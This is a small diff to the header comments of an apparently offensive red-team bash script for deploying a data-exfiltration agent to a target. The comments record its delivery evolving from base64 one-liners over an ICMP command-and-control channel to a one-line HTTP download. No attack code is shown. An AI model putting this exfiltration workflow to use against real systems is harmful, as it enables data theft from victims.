@@ -1,7 +1,9 @@
 #!/bin/bash
 # ============================================
-# Red Team - Deploy Exfil Agent to Target
-# Starts HTTP server and prints one-liner for C2
+# Red Team - Deploy Exfil Agent to Target  v3
+# v1: base64 one-liner (too long for ICMP C2)
+# v2: gzip + chunked base64 (麻煩, 要貼多段)
+# v3: HTTP download (一行搞定)
 # ============================================
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
